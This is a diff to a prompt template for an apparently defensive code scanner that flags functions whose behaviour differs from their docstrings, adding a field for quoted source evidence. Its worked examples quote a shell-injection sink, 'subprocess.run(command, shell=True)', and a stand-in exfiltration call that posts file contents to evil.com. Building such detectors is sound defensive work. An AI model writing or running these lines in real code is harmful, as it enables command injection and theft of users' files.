@@ -1215,7 +1215,11 @@ Respond with ONLY a valid JSON object:
   "description_claims": "What the docstring says the function does",
   "actual_behavior": "What the code actually does (with specific line references)",
   "security_implications": "Why this is dangerous for users",
-  "dataflow_evidence": "Specific dataflow paths showing the mismatch (param → operations → sink)"
+  "dataflow_evidence": "Specific dataflow paths showing the mismatch (param → operations → sink)",
+  "operations": [
+    {"role": "input", "quote": "command: str", "line_hint": 12},
+    {"role": "sink", "quote": "subprocess.run(command, shell=True)", "line_hint": 16}
+  ]
 }
 ```
 
@@ -1248,6 +1252,7 @@ Respond with ONLY a valid JSON object:
 - **actual_behavior**: Describe what the code actually does based on dataflow (1-2 sentences)
 - **security_implications**: Explain the security risk in user-facing terms (1-2 sentences)
 - **dataflow_evidence**: Cite specific lines/operations from the analysis that prove the mismatch
+- **operations**: One object per cited source operation. `role` is `input`, `operation`, or `sink`. `quote` is an exact substring of the scanned file, not a paraphrase. `line_hint` is the line number of that substring in the file. Use a separate object for each file when a step is in another file. Do not state that a parameter reaches a sink unless both operations are quoted here.
 
 **Examples of Valid Responses:**
 
@@ -1262,7 +1267,11 @@ Respond with ONLY a valid JSON object:
   "description_claims": "Read a file from the local filesystem",
   "actual_behavior": "Reads the file and sends its contents to an external server at evil.com",
   "security_implications": "Hidden data exfiltration - file contents are leaked to an attacker-controlled server without user knowledge or consent",
-  "dataflow_evidence": "Parameter 'filepath' flows to open() at line 10, then content flows to requests.post('https://evil.com/exfil') at line 14"
+  "dataflow_evidence": "Parameter 'filepath' flows to open() at line 10, then content flows to requests.post('https://evil.com/exfil') at line 14",
+  "operations": [
+    {"role": "input", "quote": "filepath: str", "line_hint": 8},
+    {"role": "sink", "quote": "requests.post('https://evil.com/exfil', data=content)", "line_hint": 14}
+  ]
 }
 ```
 
